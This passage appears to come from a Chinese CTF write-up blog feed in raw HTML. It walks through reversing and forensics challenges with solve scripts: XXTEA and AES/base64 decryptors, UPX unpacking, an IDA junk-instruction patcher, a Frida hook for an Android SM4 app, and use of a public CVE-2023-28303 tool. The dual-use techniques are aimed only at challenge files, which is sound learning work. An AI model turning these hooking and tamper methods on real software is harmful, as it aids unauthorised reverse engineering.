class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x87654321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;6^y<span class="string">&lt;&lt;4) + (y&gt;</span>&gt;2^z&lt;&lt;5)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cipher[<span class="number">4</span>] = { <span class="number">1374278842</span>, <span class="number">2136006540</span>, <span class="number">4191056815</span>, <span class="number">3248881376</span> };</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = { <span class="number">0x67452301</span>,<span class="number">0xefcdab89</span>,<span class="number">0x98badcfe</span>, <span class="number">0x10325476</span> };</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xxtea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      </span><br><span class="line">    {</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            {</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            }</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        } <span class="keyword">while</span> (--rounds);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    xxtea(cipher, <span class="number">-4</span>, key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//printf("0x%x",cipher[i]);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%x,0x%x,0x%x,0x%x,"</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">0</span>) &amp; <span class="number">0xff</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">1</span>) &amp; <span class="number">0xff</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">2</span>) &amp; <span class="number">0xff</span>, *((<span class="type">char</span>*)&amp;cipher[i] + <span class="number">3</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="type">int</span> Dec[] =</span><br><span class="line">    {</span><br><span class="line">        <span class="number">0x79</span>,<span class="number">0x4f</span>,<span class="number">0x55</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x33</span>,<span class="number">0x67</span>,<span class="number">0x30</span>,<span class="number">0x6f</span>,<span class="number">0x44</span>,<span class="number">0x40</span>,<span class="number">0x74</span>,<span class="number">0x50</span>,<span class="number">0x77</span>,<span class="number">0x35</span>,<span class="number">0x48</span></span><br><span class="line">    };</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, Dec[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h1><p>谷歌识图</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730120841036.png" alt="image-20230730120841036"></p><p>dovahkiin字体</p><p>逐个对照即可</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730120941846.png" alt="image-20230730120941846"></p><h1 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h1><p>Google搜索 <code>github CVE-2023-28303</code></p><p>搜出个工具</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730121141684.png" alt="image-20230730121141684"></p><p>安装好 上传图片 即可得解</p><p><img src="/2023/07/30/2023%E9%80%9A%E9%85%8D%E7%AC%A6CTF-CTF-WriteUp/image-20230730121515815.png" alt="image-20230730121515815"></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023巅峰极客WriteUp</title>
      <link href="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/"/>
      <url>/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="rev-g0Re-elfUPX-x2F-AES-x2F-base64"><a href="#rev-g0Re-elfUPX-x2F-AES-x2F-base64" class="headerlink" title="rev - g0Re - elfUPX/AES/base64"></a>rev - g0Re - elfUPX/AES/base64</h1><p>查壳，发现是upx打包的elf文件</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722171539102.png" alt="image-20230722171539102" style="zoom:50%;"><p>upx -d 脱壳脱不掉，010中发现魔改的特征码</p><p>将OKXX –&gt; UPX! 即可</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722171723412.png" alt="image-20230722171723412" style="zoom:50%;"><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722171641041.png" alt="image-20230722171641041"></p><p>脱壳后拖入ida64分析</p><p>main函数审计代码</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722172020633.png" alt="image-20230722172020633"></p><p>动调提取密文</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722172403009.png" alt="image-20230722172403009"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E6CE89C8CFC5F5C9D2D9C091CE7FACCCE9CFB7C096D4EA92E2D7DF84CBA5AE93A6CABE97DFCEF0C9B7E1AE6BC4B165DBCEED9293D68CEDC3A3DA94A5AAB2B5A755</span><br></pre></td></tr></tbody></table></figure><p>然后提取aes的密钥 - 按a键转化为字符串 – &gt; wvgitbygwbk2b46d</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722172544052.png" alt="image-20230722172544052"></p><p>发现base64换表了，提取表</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722172920639.png" alt="image-20230722172920639"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">456789}<span class="comment">#IJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123ABCDEFGH</span></span><br></pre></td></tr></tbody></table></figure><p>最后动调sub，找出sub的key  –&gt;  key还是这个 </p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722173940021.png" alt="image-20230722173940021"></p><p>cyberchef—-!!!</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722175033375.png" alt="image-20230722175033375"></p><p><code>flag{g0_1s_th3_b3st_1anguage_1n_the_wOrld!_xxx}</code></p><p>exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = [<span class="number">0xE6</span>, <span class="number">0xCE</span>, <span class="number">0x89</span>, <span class="number">0xC8</span>, <span class="number">0xCF</span>, <span class="number">0xC5</span>, <span class="number">0xF5</span>, <span class="number">0xC9</span>, <span class="number">0xD2</span>, <span class="number">0xD9</span>,</span><br><span class="line">       <span class="number">0xC0</span>, <span class="number">0x91</span>, <span class="number">0xCE</span>, <span class="number">0x7F</span>, <span class="number">0xAC</span>, <span class="number">0xCC</span>, <span class="number">0xE9</span>, <span class="number">0xCF</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>,</span><br><span class="line">       <span class="number">0x96</span>, <span class="number">0xD4</span>, <span class="number">0xEA</span>, <span class="number">0x92</span>, <span class="number">0xE2</span>, <span class="number">0xD7</span>, <span class="number">0xDF</span>, <span class="number">0x84</span>, <span class="number">0xCB</span>, <span class="number">0xA5</span>,</span><br><span class="line">       <span class="number">0xAE</span>, <span class="number">0x93</span>, <span class="number">0xA6</span>, <span class="number">0xCA</span>, <span class="number">0xBE</span>, <span class="number">0x97</span>, <span class="number">0xDF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xC9</span>,</span><br><span class="line">       <span class="number">0xB7</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x6B</span>, <span class="number">0xC4</span>, <span class="number">0xB1</span>, <span class="number">0x65</span>, <span class="number">0xDB</span>, <span class="number">0xCE</span>, <span class="number">0xED</span>,</span><br><span class="line">       <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0xD6</span>, <span class="number">0x8C</span>, <span class="number">0xED</span>, <span class="number">0xC3</span>, <span class="number">0xA3</span>, <span class="number">0xDA</span>, <span class="number">0x94</span>, <span class="number">0xA5</span>,</span><br><span class="line">       <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xA7</span>]</span><br><span class="line">key = <span class="string">b"wvgitbygwbk2b46d"</span></span><br><span class="line"></span><br><span class="line">base = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    base += <span class="built_in">chr</span>(((enc[i] - key[i % <span class="number">16</span>]) ^ <span class="number">0x1a</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"><span class="built_in">print</span>(base)</span><br><span class="line">tableB = <span class="string">"456789}#IJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123ABCDEFGH"</span></span><br><span class="line">tableA = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">aes_enc = base64.b64decode(base.translate(<span class="built_in">str</span>.maketrans(tableB, tableA)))</span><br><span class="line">aes = AES.new(key=<span class="string">b"wvgitbygwbk2b46d"</span>, mode=AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(aes_enc))</span><br><span class="line"><span class="comment"># b'flag{g0_1s_th3_b3st_1anguage_1n_the_wOrld!_xxx}\x01'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="misc-foundme"><a href="#misc-foundme" class="headerlink" title="misc - foundme"></a>misc - foundme</h1><p>strings find.DMP | grep  “flag”</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722183900037.png" alt="image-20230722183900037"></p><p>根据提示  搜索引擎搜索</p><p>avif文件是一种图像的格式，推测，找出此文件打开即为flag</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722184159266.png" alt="image-20230722184159266"></p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722184353792.png" alt="image-20230722184353792"></p><p>在010中搜索avif，发现一个flag标识</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722184548349.png" alt="image-20230722184548349" style="zoom:67%;"><p>将此文件提取出来</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722185422662.png" alt="image-20230722185422662" style="zoom:67%;"><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722185441820.png" alt="image-20230722185441820" style="zoom:67%;"><p><code>flag(YOung_Ju57_fomward}</code></p><h1 id="misc-song-ape-x3D-deppsound-x2F-ook"><a href="#misc-song-ape-x3D-deppsound-x2F-ook" class="headerlink" title="misc - song - ape=deppsound/ook"></a>misc - song - ape=deppsound/ook</h1><p>文件拖入010分析，在结尾发现PK标识，而文件无文件头，猜测时PK文件，修改</p><p><code>504B0304</code></p><p>成功打开（虽然报错-文件格式错误/</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722191056932.png" alt="image-20230722191056932" style="zoom:50%;"><p>在<code>\ppt\media</code>中发现</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722191219275.png" alt="image-20230722191219275"></p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722191242953.png" alt="image-20230722191242953"></p><p>image4.png文件过大，</p><p>其余wmf文件</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722191517076.png" alt="image-20230722191517076"></p><p>对比两个png文件</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722194313658.png" alt="image-20230722194313658" style="zoom:67%;"><p>MAC 是ape文件的标识，其中ape格式也可以用deepsound加密</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722194345687.png" alt="image-20230722194345687" style="zoom:50%;"><p>而deppsound解密需要密码</p><p>在<code>\docProps</code>中 thumbnail.jpg文件是个压缩包，</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722192150166.png" alt="image-20230722192150166"></p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722192329296.png" alt="image-20230722192329296" style="zoom:67%;"><p>解码</p><p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722192739396.png" alt="image-20230722192739396"></p><p>常见弱口令 – 123456</p><p>使用deepsound解密image4.ape（修改后缀</p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722193113272.png" alt="image-20230722193113272" style="zoom:67%;"><p>ook解码 </p><img src="/2023/07/22/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2WriteUp/image-20230722193226415.png" alt="image-20230722193226415" style="zoom:67%;"><p>[Brainfuck/Ook! Obfuscation/Encoding <a href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p><p><code>this_zip_password_is_QazWsx147!@#</code></p><p>打开flag.txt即可得解</p><p><code>flag{lW9tUyrh8RzzvysrswAwY7MHR4mmbLSt}</code></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023HWS-WriteUp</title>
      <link href="/2023/07/20/2023HWS-WriteUp/"/>
      <url>/2023/07/20/2023HWS-WriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为国护， 去不了，只打了逆向区就溜了。</p><p>另外的题目是后来复现的 </p><h1 id="Android-sm4"><a href="#Android-sm4" class="headerlink" title="Android - sm4"></a>Android - sm4</h1><p>打开，apk名字<code>app-release_10_jiagu_sign</code> , 以为是要去加固，然后也确实有加固，刚开始没敢写。</p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717100625085.png" alt="image-20230717100625085"></p><p>写题的话，应该先看程序是干嘛的，就是说，运行看题，然后的话，发现有两个字符串</p><p>进入 – <code>159762dr7vh438sa</code></p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717104522000.png" alt="image-20230717104522000"></p><p>点击按钮 – <code>1313131313131313</code></p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717104532258.png" alt="image-20230717104532258"></p><p>可以使用，frida-dex脱掉加固的dex壳，好像是整壳</p><h2 id="法一：静态分析"><a href="#法一：静态分析" class="headerlink" title="法一：静态分析"></a>法一：静态分析</h2><p>主要逻辑在so层中，ida分析</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Java_com_ctf_jniex_MainActivity2_decrypt</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">8</span>]; <span class="comment">// [sp+0h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v13; <span class="comment">// [sp+8h] [bp-38h]</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">8</span>]; <span class="comment">// [sp+Ch] [bp-34h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v15; <span class="comment">// [sp+14h] [bp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v16; <span class="comment">// [sp+18h] [bp-28h] BYREF</span></span><br><span class="line">  _BYTE v17[<span class="number">3</span>]; <span class="comment">// [sp+19h] [bp-27h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *p; <span class="comment">// [sp+20h] [bp-20h]</span></span><br><span class="line"></span><br><span class="line">  sm4::setType(&amp;s, <span class="number">1</span>);</span><br><span class="line">  v7 = (<span class="type">char</span> *)(*(<span class="type">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;((<span class="type">int</span>)&amp;v16, v7);</span><br><span class="line">  sm4::setIv(&amp;s, &amp;v16);</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(p)</span>;</span><br><span class="line">  v8 = (<span class="type">char</span> *)(*(<span class="type">int</span> (__fastcall **)(<span class="type">int</span>, <span class="type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a4, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;((<span class="type">int</span>)&amp;v16, v8);</span><br><span class="line">  sm4::setKey(&amp;s, &amp;v16);</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(p)</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;(</span><br><span class="line">    (<span class="type">int</span>)v12,</span><br><span class="line">    <span class="string">"663630067D8CD8A2D819CCE0996A2FC49AEA6B31CCCC2EEE5BE59BFA0B56597CCECA2F502A4D1F92E3BC731D915E9CE4"</span>);</span><br><span class="line">  HexToStr(v14, v12);</span><br><span class="line">  sm4::decrypt(&amp;v16, &amp;s, v14);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v14[<span class="number">0</span>] &lt;&lt; <span class="number">31</span> )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v15)</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v12[<span class="number">0</span>] &lt;&lt; <span class="number">31</span> )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v13)</span>;</span><br><span class="line">  v9 = p;</span><br><span class="line">  <span class="keyword">if</span> ( !(v16 &lt;&lt; <span class="number">31</span>) )</span><br><span class="line">    v9 = v17;</span><br><span class="line">  v10 = (*(<span class="type">int</span> (__fastcall **)(<span class="type">int</span>, _BYTE *))(*(_DWORD *)a1 + <span class="number">668</span>))(a1, v9);</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(p)</span>;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现了密文<code>663630067D8CD8A2D819CCE0996A2FC49AEA6B31CCCC2EEE5BE59BFA0B56597CCECA2F502A4D1F92E3BC731D915E9CE4</code></p><p>3个显眼函数sm4::setKey和sm4::setIv还有sm4::decrypt</p><p>根据函数传参的顺序，进行sm4解密</p><p>cyberchef得到答案</p><p><code>flag{just!_enjoy!_the_match!_zyc_2022}</code></p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717102318579.png" alt="image-20230717102318579"></p><h2 id="法二：frida-hook"><a href="#法二：frida-hook" class="headerlink" title="法二：frida hook"></a>法二：frida hook</h2><p>hook<code>Java_com_ctf_jniex_MainActivity2_decrypt</code>函数</p><p>其实点击按钮是setiv</p><p>那么刚开始的界面里面呢是setkey，不过呢，那个字符串是传不进去了</p><p>应该出题人就是让你将之传进去然后调用Decrypt解密</p><p>那么编写hook，如下</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">"libjniex.so"</span>) </span><br><span class="line">    <span class="keyword">var</span> sub_31388 = base.<span class="title function_">add</span>(<span class="number">0x31388</span> + <span class="number">0x1</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_31388, {</span><br><span class="line">      <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'[*] sub_31388 (sm4_decrypt) called'</span>);</span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">        args[<span class="number">3</span>] = env.<span class="title function_">newStringUtf</span>(<span class="string">'159762dr7vh438sa'</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'[*] iv: '</span> + <span class="title function_">hexdump</span>(env.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="number">0</span>)));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'[*] key: '</span> + <span class="title function_">hexdump</span>(env.<span class="title function_">getStringUtfChars</span>(args[<span class="number">3</span>], <span class="number">0</span>)));</span><br><span class="line">      },</span><br><span class="line">      <span class="title class_">OnLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>){</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'ret == '</span> + retval);</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hook);</span><br></pre></td></tr></tbody></table></figure><img src="/2023/07/20/2023HWS-WriteUp/image-20230717104759462.png" alt="image-20230717104759462" style="zoom:50%;"><h1 id="Animals-花指令-魔改md5-混淆"><a href="#Animals-花指令-魔改md5-混淆" class="headerlink" title="Animals - 花指令+魔改md5+混淆"></a>Animals - 花指令+魔改md5+混淆</h1><p>运行程序,交互九次</p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717105222369.png" alt="image-20230717105222369"></p><p>ida64分析，定位main函数，显然发现花指令，好几处，nop掉即可</p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717101137493.png" alt="image-20230717101137493"></p><p>使用插件快速nop掉</p><p>当然也可以写个脚本自动去除</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import idc</span><br><span class="line">start_add = <span class="number">0x400800</span></span><br><span class="line">end_add = <span class="number">0x406e22</span></span><br><span class="line"><span class="keyword">for</span> i in range(start_add,end_add):</span><br><span class="line"><span class="keyword">if</span> idc.get_wide_dword(i) == <span class="number">0x08750a74</span>:</span><br><span class="line"><span class="keyword">for</span> mm in range(<span class="number">9</span>):</span><br><span class="line">ida_bytes.patch_byte(i+mm,<span class="number">0x90</span>)</span><br><span class="line">elif idc.get_wide_dword(i) == <span class="number">0x13751574</span>:</span><br><span class="line"><span class="keyword">for</span> m in range(<span class="number">23</span>):</span><br><span class="line">ida_bytes.patch_byte(i+m,<span class="number">0x90</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717101305555.png" alt="image-20230717101305555"></p><p>修复完成后，发现了混淆，使用插件d810去除</p><p>去除后代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 